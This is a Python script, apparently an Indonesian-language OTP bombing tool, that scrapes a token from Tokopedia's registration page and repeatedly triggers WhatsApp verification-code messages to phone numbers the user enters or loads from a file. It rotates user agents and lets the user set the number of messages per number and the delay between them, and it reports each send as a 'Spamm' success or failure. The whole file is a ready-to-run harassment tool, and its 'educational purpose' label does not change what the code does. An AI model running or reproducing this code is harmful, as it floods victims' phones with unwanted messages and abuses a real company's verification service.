# use for educational purpose
import requests, random, time, re, os

h = "\x1b[92m"
m = "\x1b[91m"
k = "\x1b[93m"

class spam:
    def __init__(self, nomer):
        self.nomer = nomer

    def tokped(self):
        rands = random.choice(open("ua.txt").readlines()).split("\n")[0]
        kirim = {
            "User-Agent" : rands,
            "Accept-Encoding" : "gzip, deflate",
            "Connection" : "keep-alive",
            "Origin" : "https://accounts.tokopedia.com",
            "Accept" : "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With" : "XMLHttpRequest",
            "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8"
        }
        regist = requests.get(f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{self.nomer}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers=kirim).text
        Token = re.search(r"\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>", regist).group(1)
        formulir = {
            "otp_type": "116",
            "msisdn": self.nomer,
            "tk": Token,
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        req = requests.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers=kirim, data=formulir).text
        if "kamu sudah melakukan 3 kali pengiriman kode" in req:
            return f"\x1b[91mSpamm Tokped {self.nomer} {m}Fail!"
        else:
            return f"\x1b[92mSpamm Tokped {self.nomer} {h}Success!"

def baca_nomer_dari_file(file_path):
    try:
        with open(file_path, 'r') as file:
            nomer_list = [line.strip() for line in file.readlines()]
        return nomer_list
    except FileNotFoundError:
        print(m + "File tidak ditemukan!" + h)
        return []

def single():
    pilihan = input(k + "Mau input nomor manual atau dari file (y/n)? " + h)
    if pilihan.lower() == 'n':
        nomer = str(input(k + "\tNomer Telepon : " + h))
        nomer_list = [nomer]
    elif pilihan.lower() == 'y':
        file_path = input(k + "\tMasukkan path file (contoh: nomer.txt) : " + h)
        nomer_list = baca_nomer_dari_file(file_path)
    else:
        print(m + "Pilihan tidak valid!" + h)
        return

    if not nomer_list:
        print(m + "Tidak ada nomor untuk diproses." + h)
        return

    jm = int(input(k + "\tTotal Spam per nomor : " + h))
    dly = int(input(k + "\tDelay : " + h))

    for nomer in nomer_list:
        for oo in range(jm):
            z = spam(nomer)
            print("\t" + z.tokped())
            time.sleep(dly)

def multi():
    pilihan = input(k + "Mau input nomor manual atau dari file (y/n)? " + h)
    if pilihan.lower() == 'n':
        nomer = []
        jum = int(input(k + "\tTotal Nomer : " + h))
        for i in range(jum):
            nomer.append(str(input(k + f"\tNomer -{i+1} : " + h)))
    elif pilihan.lower() == 'y':
        file_path = input(k + "\tMasukkan path file (contoh: nomer.txt) : " + h)
        nomer = baca_nomer_dari_file(file_path)
    else:
        print(m + "Pilihan tidak valid!" + h)
        return

    if not nomer:
        print(m + "Tidak ada nomor untuk diproses." + h)
        return

    spm = int(input(k + "\tTotal Spam per nomor : " + h))
    dly = int(input(k + "\tDelay : " + h))
    kk = len(nomer)
    for i in range(spm):
        for ss in range(kk):
            z = spam(nomer[ss])
            print("\t" + z.tokped())
        time.sleep(dly)

def main():
    while True:
        os.system("clear")
        print("Author : Nizar"+m)
        print("1. Single Number")
        print("2. Multi Number")
        pil = input(k+"Pilih (1/2):"+h)
        if pil == "1":
            single()
        elif pil == "2":
            multi()
        else:
            print(m+"Invalid choice")

        ulang = input(k + "Mau ngulang lagi? (y/n) : " + h)
        if ulang.lower() != 'y':
            print(m + "Exiting program..." + h)
            break

if __name__ == "__main__":
    main()